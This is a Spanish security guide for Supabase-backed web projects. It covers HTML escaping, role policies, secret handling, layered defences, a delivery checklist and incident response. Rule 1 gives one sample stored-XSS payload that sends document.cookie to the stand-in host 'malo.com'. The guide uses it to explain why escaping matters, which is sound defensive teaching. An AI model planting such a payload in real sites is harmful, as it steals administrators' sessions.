# Guía de seguridad

Lo que hay que hacer en cada proyecto, por qué, y qué pasa si no.
Fecha: 2026-07-29.

No es una lista de buenas intenciones: cada punto salió de un hueco real
encontrado en este sistema.

---

## Las 4 reglas que no se negocian

### 1. Todo texto de un tercero pasa por `esc()` antes de tocar `innerHTML`

**El ataque, en concreto:** alguien pone como nombre
`<img src=x onerror="fetch('//malo.com?c='+document.cookie)">` en el
checkout. No pasa nada… hasta que **el dueño abre su panel de pedidos**.
Ahí el navegador ejecuta ese código **con la sesión de administrador
abierta**. Se llama XSS almacenado y es la forma más común de robar un
panel.

Lo insidioso es que la víctima no es quien lo escribió: es quien lo lee.

```js
❌ el.innerHTML = `<b>${cliente.nombre}</b>`
✅ el.innerHTML = `<b>${esc(cliente.nombre)}</b>`
✅ el.textContent = cliente.nombre          // mejor aún: nada que escapar
```

Está en [`03-componentes-ui/seguridad.js`](../03-componentes-ui/seguridad.js)
y copiado en las 9 demos.

**Regla para revisar:** busca `innerHTML` en el archivo. Por cada `${...}`
pregúntate *"¿quién escribió esto?"*. Si la respuesta no es "yo o el
dueño", va con `esc()`. Ante la duda, `esc()` — no rompe nada.

### 2. `authenticated` **no** significa "administrador"

`auth.role() = 'authenticated'` quiere decir *"cualquiera con cuenta"*. En
un proyecto con registro abierto, eso es cualquier persona de internet que
se registre. Si esa política protege la tabla de clientes, acabas de
publicar la base de datos.

Usa `es_admin()` / `es_staff()` de
[`02-bases/auth/supabase.schema.sql`](../02-bases/auth/supabase.schema.sql).

**Cuándo sí sirve `authenticated`:** si las únicas cuentas del proyecto son
las del dueño y su equipo (registro cerrado). Apenas se abra el registro,
hay que cambiarlo.

### 3. El `.env` nunca se sube, y la `service_role` nunca sale del servidor

- `.env` en `.gitignore`, siempre. Verifícalo con `git status` antes del
  primer commit.
- La llave **anon** de Supabase es pública, va en el frontend, está bien.
- La **`service_role`** salta todas las políticas RLS. En el navegador
  equivale a publicar la base con permisos de dueño. Solo vive en el
  servidor (Edge Functions).
- Si una clave secreta se filtró alguna vez — a un chat, a un commit, a un
  correo — **rótala**. No basta con borrar el mensaje.

### 4. Validar en el navegador no es validar

Todo lo de `seguridad.js` se salta con la consola abierta. Un bot ni
siquiera ejecuta tu JavaScript: manda el POST directo. La validación del
navegador es para que la persona vea el error rápido.

La que protege es la de la base: los `check` de tamaño y el freno
anti-spam de
[`02-bases/auth/seguridad.schema.sql`](../02-bases/auth/seguridad.schema.sql).
Las dos, no una.

---

## Qué protege cada capa

| Capa | Detiene | NO detiene |
|---|---|---|
| `esc()` en el frontend | XSS almacenado | bots, manipulación de datos |
| Validación en el navegador | errores de tipeo | a cualquiera con la consola abierta |
| `check` de tamaño en la base | textos gigantes, totales absurdos | spam a ritmo normal |
| Freno anti-spam | inundación de formularios | un bot lento y paciente |
| Políticas RLS | lectura/escritura no autorizada | un dato mal escrito por alguien autorizado |
| Bitácora | nada — pero deja **rastro** | (es forense, no preventivo) |

Ninguna sirve sola. La RLS es la más importante: es la única que sigue
protegiendo cuando el atacante ignora tu página por completo y le habla
directo a la API.

---

## Lo que sigue sin estar cubierto — dilo, no lo escondas

- **Captcha real.** El freno anti-spam es un límite global por hora, no
  distingue personas. Un captcha de verdad se valida en el servidor:
  necesita `backend-pro` o una Edge Function propia.
- **Límite por IP.** Postgres no ve la IP del visitante. Requiere backend.
- **Cabeceras de seguridad** (CSP, HSTS, X-Frame-Options). Se configuran
  en el hosting, no en el código. En Vercel es un `vercel.json`. **No está
  hecho** — hazlo al publicar.
- **Copias de seguridad.** El plan gratuito de Supabase **no las tiene**.
  Si el cliente va a operar en serio, o paga el plan que las incluye, o
  alguien exporta a mano cada semana. Un negocio que pierde su base de
  clientes no vuelve a contratarte.
- **2FA en las cuentas.** Es del cliente, no tuyo, pero recomiéndalo por
  escrito: la cuenta de Supabase y la de la pasarela son las dos llaves
  del negocio.

---

## Antes de entregar cualquier proyecto

```
FRONTEND
[ ] Ningún ${...} de datos de terceros sin esc() en innerHTML
[ ] Formularios públicos validan y recortan antes de guardar
[ ] Ningún secreto en el código ni en la ficha de contexto

BASE DE DATOS
[ ] RLS ACTIVADO en todas las tablas (revísalo tabla por tabla en el panel)
[ ] Probado sin sesión: lo privado devuelve vacío, no datos
[ ] es_admin() donde "cualquier usuario con cuenta" no debe alcanzar
[ ] seguridad.schema.sql corrido (bitácora + límites)
[ ] Datos semilla de ejemplo BORRADOS

CUENTAS Y CLAVES
[ ] .env en .gitignore, verificado con git status
[ ] service_role no aparece en ningún archivo del frontend
[ ] Cuentas de prueba eliminadas (nada de admin/admin123 en producción)
[ ] Contraseñas creadas por sus dueños, no por ti

PUBLICACIÓN
[ ] HTTPS activo
[ ] Cabeceras de seguridad configuradas en el hosting
[ ] Confirmación de correo decidida a conciencia (no por defecto)
[ ] Copias de seguridad: definido quién y cada cuánto

LEGAL (Colombia — Ley 1581 de 2012)
[ ] Si se guardan datos personales: política de privacidad publicada
[ ] Casilla de autorización en los formularios
[ ] El cliente sabe que la responsabilidad del tratamiento es suya
```

## La prueba de 2 minutos que encuentra el 80% de los problemas

1. Abre el sitio **en ventana de incógnito**, sin iniciar sesión.
2. Abre la consola del navegador.
3. Pide una tabla que debería ser privada con la anon key.
4. **Si devuelve datos, la RLS está mal.** Debe devolver una lista vacía.

Repítelo con cada tabla que tenga datos de personas. Es la diferencia
entre creer que está seguro y saberlo.

## Si algo pasa

1. Rota las claves comprometidas (Supabase y pasarela, ambas).
2. Revisa la bitácora: `select * from bitacora order by ocurrio_en desc`.
3. Cierra todas las sesiones abiertas desde el panel de Supabase.
4. **Avísale al cliente el mismo día.** Si hubo datos personales de
   terceros, la obligación de informar es suya, pero el que sabe eres tú.
   Ocultarlo es lo único que convierte un incidente en un problema legal.
